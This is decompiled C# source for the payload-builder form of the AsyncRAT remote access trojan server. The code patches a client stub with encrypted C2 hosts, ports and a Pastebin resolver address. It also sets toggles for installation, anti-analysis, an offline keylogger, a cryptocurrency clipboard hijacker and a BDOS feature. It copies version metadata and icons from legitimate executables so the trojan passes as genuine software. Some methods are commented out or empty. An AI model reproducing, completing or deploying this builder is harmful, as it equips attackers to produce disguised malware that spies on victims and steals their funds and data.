using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Server.Algorithm;
using Server.Helper;
using Server.Properties;
using Toolbelt.Drawing;
using Vestris.ResourceLib;

namespace Server.Forms
{
	// Token: 0x02000080 RID: 128
	public partial class FormBuilder : Form
	{
		// Token: 0x0600032F RID: 815 RVA: 0x00003CD6 File Offset: 0x00001ED6
		public FormBuilder()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000330 RID: 816 RVA: 0x00023A38 File Offset: 0x00021C38
		private void SaveSettings()
		{
			try
			{
				List<string> list = new List<string>();
				foreach (object obj in this.listBoxPort.Items)
				{
					string item = (string)obj;
					list.Add(item);
				}
				//Settings.Default.Ports = string.Join(",", list);
				List<string> list2 = new List<string>();
				foreach (object obj2 in this.listBoxIP.Items)
				{
					string item2 = (string)obj2;
					list2.Add(item2);
				}
				//Settings.Default.IP = string.Join(",", list2);
				//Settings.Default.Save();
			}
			catch
			{
			}
		}

		// Token: 0x06000331 RID: 817 RVA: 0x00023B40 File Offset: 0x00021D40
		private void checkBox1_CheckedChanged(object sender, EventArgs e)
		{
			if (this.checkBox1.Checked)
			{
				this.checkBox1.Text = "ON";
				this.textFilename.Enabled = true;
				this.comboBoxFolder.Enabled = true;
				return;
			}
			this.checkBox1.Text = "OFF";
			this.textFilename.Enabled = false;
			this.comboBoxFolder.Enabled = false;
		}

		// Token: 0x06000332 RID: 818 RVA: 0x00023BAC File Offset: 0x00021DAC
		private void Builder_Load(object sender, EventArgs e)
		{
			//this.comboBoxFolder.SelectedIndex = 0;
			//if (Settings.Default.IP.Length == 0)
			//{
			//	this.listBoxIP.Items.Add("127.0.0.1");
			//}
			//if (Settings.Default.Pastebin.Length == 0)
			//{
			//	this.txtPastebin.Text = "https://pastebin.com/raw/s14cUU5G";
			//}
			//try
			//{
			//	foreach (string text in Settings.Default.Ports.Split(new string[]
			//	{
			//		","
			//	}, StringSplitOptions.None))
			//	{
			//		if (!string.IsNullOrWhiteSpace(text))
			//		{
			//			this.listBoxPort.Items.Add(text.Trim());
			//		}
			//	}
			//}
			//catch
			//{
			//}
			//try
			//{
			//	//foreach (string text2 in Settings.Default.IP.Split(new string[]
			//	//{
			//	//	","
			//	//}, StringSplitOptions.None))
			//	{
			//		//if (!string.IsNullOrWhiteSpace(text2))
			//		//{
			//		//	this.listBoxIP.Items.Add(text2.Trim());
			//		//}
			//	}
			//}
			//catch
			//{
			//}
			//if (Settings.Default.Mutex.Length == 0)
			{
				this.txtMutex.Text = this.getRandomCharacters();
			}
		}

		// Token: 0x06000333 RID: 819 RVA: 0x00023CF8 File Offset: 0x00021EF8
		private void CheckBox2_CheckedChanged(object sender, EventArgs e)
		{
			if (this.chkPastebin.Checked)
			{
				this.txtPastebin.Enabled = true;
				this.textIP.Enabled = false;
				this.textPort.Enabled = false;
				this.listBoxIP.Enabled = false;
				this.listBoxPort.Enabled = false;
				this.btnAddIP.Enabled = false;
				this.btnAddPort.Enabled = false;
				this.button_0.Enabled = false;
				this.btnRemovePort.Enabled = false;
				return;
			}
			this.txtPastebin.Enabled = false;
			this.textIP.Enabled = true;
			this.textPort.Enabled = true;
			this.listBoxIP.Enabled = true;
			this.listBoxPort.Enabled = true;
			this.btnAddIP.Enabled = true;
			this.btnAddPort.Enabled = true;
			this.button_0.Enabled = true;
			this.btnRemovePort.Enabled = true;
		}

		// Token: 0x06000334 RID: 820 RVA: 0x00003CEF File Offset: 0x00001EEF
		private void BtnRemovePort_Click(object sender, EventArgs e)
		{
			if (this.listBoxPort.SelectedItems.Count == 1)
			{
				this.listBoxPort.Items.Remove(this.listBoxPort.SelectedItem);
			}
		}

		// Token: 0x06000335 RID: 821 RVA: 0x00023DEC File Offset: 0x00021FEC
		private void BtnAddPort_Click(object sender, EventArgs e)
		{
			try
			{
				Convert.ToInt32(this.textPort.Text.Trim());
				//using (IEnumerator enumerator = this.listBoxPort.Items.GetEnumerator())
				//{
				//	while (enumerator.MoveNext())
				//	{
				//		if (((string)enumerator.Current).Equals(this.textPort.Text.Trim()))
				//		{
				//			return;
				//		}
				//	}
				//}
				this.listBoxPort.Items.Add(this.textPort.Text.Trim());
				this.textPort.Clear();
			}
			catch
			{
			}
		}

		// Token: 0x06000336 RID: 822 RVA: 0x00003D1F File Offset: 0x00001F1F
		private void BtnRemoveIP_Click(object sender, EventArgs e)
		{
			if (this.listBoxIP.SelectedItems.Count == 1)
			{
				this.listBoxIP.Items.Remove(this.listBoxIP.SelectedItem);
			}
		}

		// Token: 0x06000337 RID: 823 RVA: 0x00023EB0 File Offset: 0x000220B0
		private void BtnAddIP_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.listBoxIP.Items)
				{
					string text = (string)obj;
					this.textIP.Text = this.textIP.Text.Replace(" ", "");
					if (text.Equals(this.textIP.Text))
					{
						return;
					}
				}
				this.listBoxIP.Items.Add(this.textIP.Text.Replace(" ", ""));
				this.textIP.Clear();
			}
			catch
			{
			}
		}

		// Token: 0x06000338 RID: 824 RVA: 0x00023F88 File Offset: 0x00022188
		private void BtnBuild_Click(object sender, EventArgs e)
		{
			//FormBuilder.<BtnBuild_Click>d__9 <BtnBuild_Click>d__;
			//<BtnBuild_Click>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			//<BtnBuild_Click>d__.<>4__this = this;
			//<BtnBuild_Click>d__.<>1__state = -1;
			//<BtnBuild_Click>d__.<>t__builder.Start<FormBuilder.<BtnBuild_Click>d__9>(ref <BtnBuild_Click>d__);
		}

		// Token: 0x06000339 RID: 825 RVA: 0x00023FC0 File Offset: 0x000221C0
		private void WriteAssembly(string filename)
		{
			try
			{
				VersionResource versionResource = new VersionResource();
				versionResource.LoadFrom(filename);
				versionResource.FileVersion = this.txtFileVersion.Text;
				versionResource.ProductVersion = this.txtProductVersion.Text;
				versionResource.Language = 0;
				StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
				stringFileInfo["ProductName"] = this.txtProduct.Text;
				stringFileInfo["FileDescription"] = this.txtDescription.Text;
				stringFileInfo["CompanyName"] = this.txtCompany.Text;
				stringFileInfo["LegalCopyright"] = this.txtCopyright.Text;
				stringFileInfo["LegalTrademarks"] = this.txtTrademarks.Text;
				stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
				stringFileInfo["InternalName"] = this.txtOriginalFilename.Text;
				stringFileInfo["OriginalFilename"] = this.txtOriginalFilename.Text;
				stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
				stringFileInfo["FileVersion"] = versionResource.FileVersion;
				versionResource.SaveTo(filename);
			}
			catch (Exception ex)
			{
				throw new ArgumentException("Assembly: " + ex.Message);
			}
		}

		// Token: 0x0600033A RID: 826 RVA: 0x0002411C File Offset: 0x0002231C
		private void BtnAssembly_CheckedChanged(object sender, EventArgs e)
		{
			if (this.btnAssembly.Checked)
			{
				this.btnClone.Enabled = true;
				this.txtProduct.Enabled = true;
				this.txtDescription.Enabled = true;
				this.txtCompany.Enabled = true;
				this.txtCopyright.Enabled = true;
				this.txtTrademarks.Enabled = true;
				this.txtOriginalFilename.Enabled = true;
				this.txtOriginalFilename.Enabled = true;
				this.txtProductVersion.Enabled = true;
				this.txtFileVersion.Enabled = true;
				return;
			}
			this.btnClone.Enabled = false;
			this.txtProduct.Enabled = false;
			this.txtDescription.Enabled = false;
			this.txtCompany.Enabled = false;
			this.txtCopyright.Enabled = false;
			this.txtTrademarks.Enabled = false;
			this.txtOriginalFilename.Enabled = false;
			this.txtOriginalFilename.Enabled = false;
			this.txtProductVersion.Enabled = false;
			this.txtFileVersion.Enabled = false;
		}

		// Token: 0x0600033B RID: 827 RVA: 0x00003D4F File Offset: 0x00001F4F
		private void ChkIcon_CheckedChanged(object sender, EventArgs e)
		{
			if (this.chkIcon.Checked)
			{
				this.txtIcon.Enabled = true;
				this.btnIcon.Enabled = true;
				return;
			}
			this.txtIcon.Enabled = false;
			this.btnIcon.Enabled = false;
		}

		// Token: 0x0600033C RID: 828 RVA: 0x00024228 File Offset: 0x00022428
		private void BtnIcon_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Title = "Choose Icon";
				openFileDialog.Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico";
				openFileDialog.Multiselect = false;
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					if (openFileDialog.FileName.ToLower().EndsWith(".exe"))
					{
						string icon = this.GetIcon(openFileDialog.FileName);
						this.txtIcon.Text = icon;
						this.picIcon.ImageLocation = icon;
					}
					else
					{
						this.txtIcon.Text = openFileDialog.FileName;
						this.picIcon.ImageLocation = openFileDialog.FileName;
					}
				}
			}
		}

		// Token: 0x0600033D RID: 829 RVA: 0x000242E0 File Offset: 0x000224E0
		private string GetIcon(string path)
		{
			try
			{
				string text = Path.GetTempFileName() + ".ico";
				using (FileStream fileStream = new FileStream(text, FileMode.Create))
				{
					IconExtractor.Extract1stIconTo(path, fileStream);
				}
				return text;
			}
			catch
			{
			}
			return "";
		}

		// Token: 0x0600033E RID: 830 RVA: 0x00024344 File Offset: 0x00022544
		private void WriteSettings(ModuleDefMD asmDef, string AsmName)
		{
			try
			{
				string randomString = Methods.GetRandomString(32);
				Aes256 aes = new Aes256(randomString);
				X509Certificate2 x509Certificate = new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
				X509Certificate2 x509Certificate2 = new X509Certificate2(x509Certificate.Export(X509ContentType.Cert));
				byte[] inArray;
				using (RSACryptoServiceProvider rsacryptoServiceProvider = (RSACryptoServiceProvider)x509Certificate.PrivateKey)
				{
					byte[] rgbHash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(randomString));
					inArray = rsacryptoServiceProvider.SignHash(rgbHash, CryptoConfig.MapNameToOID("SHA256"));
				}
				foreach (TypeDef typeDef in asmDef.Types)
				{
					asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
					asmDef.Name = Path.GetFileName(AsmName);
					if (typeDef.Name == "Settings")
					{
						foreach (MethodDef methodDef in typeDef.Methods)
						{
							if (methodDef.Body != null)
							{
								for (int i = 0; i < methodDef.Body.Instructions.Count<Instruction>(); i++)
								{
									if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr)
									{
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Ports%")
										{
											if (this.chkPastebin.Enabled && this.chkPastebin.Checked)
											{
												methodDef.Body.Instructions[i].Operand = aes.Encrypt("null");
											}
											else
											{
												List<string> list = new List<string>();
												foreach (object obj in this.listBoxPort.Items)
												{
													string item = (string)obj;
													list.Add(item);
												}
												methodDef.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", list));
											}
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Hosts%")
										{
											if (this.chkPastebin.Enabled && this.chkPastebin.Checked)
											{
												methodDef.Body.Instructions[i].Operand = aes.Encrypt("null");
											}
											else
											{
												List<string> list2 = new List<string>();
												foreach (object obj2 in this.listBoxIP.Items)
												{
													string item2 = (string)obj2;
													list2.Add(item2);
												}
												methodDef.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", list2));
											}
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Install%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.checkBox1.Checked.ToString().ToLower());
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Folder%")
										{
											methodDef.Body.Instructions[i].Operand = this.comboBoxFolder.Text;
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%File%")
										{
											methodDef.Body.Instructions[i].Operand = this.textFilename.Text;
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Version%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(Settings.Version.Replace("AsyncRAT ", ""));
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Key%")
										{
											methodDef.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(randomString));
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%MTX%")
										{
											if (string.IsNullOrWhiteSpace(this.txtMutex.Text))
											{
												methodDef.Body.Instructions[i].Operand = this.getRandomCharacters();
											}
											else
											{
												methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.txtMutex.Text);
											}
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Anti%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.chkAnti.Checked.ToString().ToLower());
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%offlinekl%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.checkBox2.Checked.ToString().ToLower());
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%clipper%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.checkBox3.Checked.ToString().ToLower());
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%BTC%")
										{
											//methodDef.Body.Instructions[i].Operand = aes.Encrypt(Settings.Default.btc);
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%ETH%")
										{
											//methodDef.Body.Instructions[i].Operand = aes.Encrypt(Settings.Default.eth);
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Tron%")
										{
											//methodDef.Body.Instructions[i].Operand = aes.Encrypt(Settings.Default.usdt);
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Certificate%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(x509Certificate2.Export(X509ContentType.Cert)));
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Serversignature%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(inArray));
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%BDOS%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.chkBdos.Checked.ToString().ToLower());
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Pastebin%")
										{
											if (this.chkPastebin.Checked)
											{
												methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.txtPastebin.Text);
											}
											else
											{
												methodDef.Body.Instructions[i].Operand = aes.Encrypt("null");
											}
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Delay%")
										{
											methodDef.Body.Instructions[i].Operand = this.numDelay.Value.ToString();
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Group%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.txtGroup.Text);
										}
									}
								}
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				throw new ArgumentException("WriteSettings: " + ex.Message);
			}
		}

		// Token: 0x0600033F RID: 831 RVA: 0x00024DA0 File Offset: 0x00022FA0
		public string getRandomCharacters()
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 1; i <= new Random().Next(10, 20); i++)
			{
				int index = this.random.Next(0, "asdfghjklqwertyuiopmnbvcxz".Length);
				stringBuilder.Append("asdfghjklqwertyuiopmnbvcxz"[index]);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x06000340 RID: 832 RVA: 0x00024DFC File Offset: 0x00022FFC
		private void BtnClone_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "Executable (*.exe)|*.exe";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);
					this.txtOriginalFilename.Text = (versionInfo.InternalName ?? string.Empty);
					this.txtDescription.Text = (versionInfo.FileDescription ?? string.Empty);
					this.txtCompany.Text = (versionInfo.CompanyName ?? string.Empty);
					this.txtProduct.Text = (versionInfo.ProductName ?? string.Empty);
					this.txtCopyright.Text = (versionInfo.LegalCopyright ?? string.Empty);
					this.txtTrademarks.Text = (versionInfo.LegalTrademarks ?? string.Empty);
					int fileMajorPart = versionInfo.FileMajorPart;
					this.txtFileVersion.Text = string.Concat(new string[]
					{
						versionInfo.FileMajorPart.ToString(),
						".",
						versionInfo.FileMinorPart.ToString(),
						".",
						versionInfo.FileBuildPart.ToString(),
						".",
						versionInfo.FilePrivatePart.ToString()
					});
					this.txtProductVersion.Text = string.Concat(new string[]
					{
						versionInfo.FileMajorPart.ToString(),
						".",
						versionInfo.FileMinorPart.ToString(),
						".",
						versionInfo.FileBuildPart.ToString(),
						".",
						versionInfo.FilePrivatePart.ToString()
					});
				}
			}
		}

		// Token: 0x06000341 RID: 833 RVA: 0x00024FE4 File Offset: 0x000231E4
		private void checkBox3_CheckedChanged(object sender, EventArgs e)
		{
			if (this.checkBox3.Checked)
			{
				using (Clipper clipper = new Clipper())
				{
					if (clipper.ShowDialog() != DialogResult.OK)
					{
						this.checkBox3.Checked = false;
					}
				}
			}
		}

		// Token: 0x04000231 RID: 561
		private readonly Random random = new Random();
	}
}
